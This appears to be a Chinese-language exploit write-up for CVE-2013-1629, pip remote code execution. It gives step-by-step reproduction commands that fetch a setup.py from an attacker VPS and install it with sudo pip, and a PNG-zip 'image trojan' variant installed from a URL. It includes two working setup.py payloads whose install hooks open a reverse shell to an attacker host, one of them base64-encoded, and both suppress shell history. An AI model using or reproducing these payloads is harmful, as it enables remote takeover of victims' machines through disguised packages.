# Python pip install RCE 漏洞 CVE-2013-1629

## 漏洞描述

当通过 HTTP 从 Pypi 存储库检索包时，不会检查包内容的完整性。利用这个缺陷，攻击者可以通过 `pip install` 来执行代码。

参考阅读：

- https://github.com/0x00-0x00/FakePip
- https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-using-pip/python/sid-2098

## 漏洞影响

```
pip < 1.3
```

## 漏洞复现

### 方式 1 FakePip

将 [setup.py](#漏洞POC) 文件下载到远程目标：

```
$ wget http://your-vps-ip/setup.py
```

在 VPS 上监听端口，在远程目标上执行命令：

```
$ mkdir fakepip
$ mv setup.py fakepip/
$ cd fakepip
# sudo /usr/bin/pip install . --upgrade --force-reinstall
```

成功获取反弹 Shell。

### 方式 2 图片马

将 [setup.py](#漏洞POC) 文件放在文件夹中并压缩命名为，选择一张图片 test.png，制作图片马：

```
$ copy /b test.png + pic.zip pic.png
```

在 VPS 上监听端口，将图片上传至公网图床，复制链接，在远程目标上执行命令：

```
$ pip install " https://<your-img-link>"
```

也将图片可以上传到 VPS，在远程目标上执行命令：

```
$ pip3 install "http://192"."168"."xx"."xxx/pic.png"
```

## 漏洞 POC

方式 1 setup.py

```python
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = 'localhost'  # change this
    LPORT = 13372
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

方式 2 setup.py

```python
from setuptools import setup
import socket,subprocess,os
def run():
  import socket, time,pty, os
  host='{LHOST}'
  port='{LPORT}'
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(10)
  s.connect((host,port))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  os.putenv("HISTFILE",'/dev/null')
  pty.spawn("/bin/bash")
  s.close()
run()

setup(name="FakePip", version="1.0")
```
